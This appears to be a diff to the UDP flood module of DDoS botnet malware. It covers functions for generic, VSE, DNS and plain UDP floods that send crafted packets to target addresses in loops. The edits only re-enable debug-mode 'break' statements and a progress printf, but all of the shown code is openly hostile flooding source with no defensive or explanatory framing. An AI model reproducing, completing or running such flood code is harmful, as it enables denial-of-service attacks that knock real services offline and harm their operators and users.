@@ -119,7 +119,7 @@ void attack_udp_generic(uint8_t targs_len, struct attack_target *targs, uint8_t 
             sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
         }
 #ifdef DEBUG
-//            break;
+            break;
             if (errno != 0)
                 printf("errno = %d\n", errno);
 #endif
@@ -220,7 +220,7 @@ void attack_udp_vse(uint8_t targs_len, struct attack_target *targs, uint8_t opts
             sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
         }
 #ifdef DEBUG
-//            break;
+            break;
             if (errno != 0)
                 printf("errno = %d\n", errno);
 #endif
@@ -365,7 +365,7 @@ void attack_udp_dns(uint8_t targs_len, struct attack_target *targs, uint8_t opts
             sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
         }
 #ifdef DEBUG
-//            break;
+            break;
             if (errno != 0)
                 printf("errno = %d\n", errno);
 #endif
@@ -462,14 +462,14 @@ void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t op
             {
                 printf("send failed: %d\n", errno);
             } else {
-//                printf(".\n");
+                printf(".\n");
             }
 #else
             send(fds[i], data, data_len, MSG_NOSIGNAL);
 #endif
         }
 #ifdef DEBUG
-//            break;
+            break;
             if (errno != 0)
                 printf("errno = %d\n", errno);
 #endif
